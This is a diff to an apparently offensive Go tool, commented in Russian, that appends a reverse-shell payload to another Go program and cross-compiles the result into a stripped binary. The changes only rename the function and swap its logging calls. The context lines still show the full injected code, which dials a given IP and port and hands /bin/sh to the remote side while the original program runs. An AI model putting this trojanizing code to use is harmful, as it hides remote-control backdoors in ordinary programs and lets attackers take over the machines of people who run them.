@@ -8,11 +8,11 @@ import (
 	"strings"
 )
 
-func BindShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
+func BeaconShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 	// Открытие оригинального файла
 	original_file, err := os.OpenFile(file_path, os.O_RDWR|os.O_APPEND, 0644)
 	if err != nil {
-		fmt.Printf("[BindShell] Can't open file %s with error: %s\n", file_path, err.Error())
+		BSPrint("Can't open file %s with error: %s\n", file_path, err.Error())
 		return
 	}
 	defer original_file.Close()
@@ -77,7 +77,7 @@ func BindShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 
 	new_file, err := os.OpenFile("result.go", os.O_RDWR|os.O_APPEND, 0644)
 	if err != nil {
-		fmt.Printf("[BindShell] Can't open file %s with error: %s\n", new_file.Name(), err.Error())
+		BSPrint("Can't open file %s with error: %s\n", new_file.Name(), err.Error())
 		return
 	}
 	defer new_file.Close()
@@ -92,13 +92,13 @@ func BindShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 	case "reverse":
 		BS_string = fmt.Sprintf("\n\nfunc bs_handle(BS_conn net.Conn) {\n\tBS_conn.Write([]byte(\"%s\"))\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_conn, _ := net.Dial(\"tcp\", \"%s:%d\")\n\tbs_handle(BS_conn)\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}", OS, ip, port)
 	default:
-		fmt.Println("[BindShell] Incorrect shell type!")
+		BSPrint("Incorrect shell type!\n")
 		return
 	}
 
 	// Добавление инъекции в файл
 	if _, err := new_file.WriteString(BS_string); err != nil {
-		fmt.Println("[BindShell] Can't modify file!")
+		BSPrint("Can't modify file!\n")
 		return
 	}
 
@@ -110,37 +110,37 @@ func BindShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 	// Замена переменной окружения GOOS на целевую ОС
 	err = os.Setenv("GOOS", OS)
 	if err != nil {
-		fmt.Println("[BindShell] Can't change GOOS!", err)
+		BSPrint("Can't change GOOS!\n", err)
 		return
 	}
 
 	// Замена переменной окружения ARCHOS на целевую архитектуру
 	err = os.Setenv("GOARCH", Arch)
 	if err != nil {
-		fmt.Println("[BindShell] Can't change GOARCH!", err)
+		BSPrint("Can't change GOARCH!\n", err)
 		return
 	}
 
 	// Компиляция файла
 	cmd := exec.Command("go", "build", "-o", shell_type, "-ldflags", "-w -s", "result.go")
 	if err := cmd.Run(); err != nil {
-		fmt.Println("[BindShell] Compilation error!", err)
+		BSPrint("Compilation error!\n", err)
 		return
 	}
 
 	// Замена переменной окружения GOOS на исходную ОС
 	err = os.Setenv("GOOS", old_GOOS)
 	if err != nil {
-		fmt.Println("[BindShell] Can't change GOOS!", err)
+		BSPrint("Can't change GOOS!\n", err)
 		return
 	}
 
 	// Замена переменной окружения ARCHOS на исходную архитектуру
 	err = os.Setenv("GOARCH", old_GOARCH)
 	if err != nil {
-		fmt.Println("[BindShell] Can't change GOARCH!", err)
+		BSPrint("Can't change GOARCH!\n", err)
 		return
 	}
 
-	fmt.Println("[BindShell] File successfully compiled.")
+	BSPrint("File successfully compiled.\n")
 }
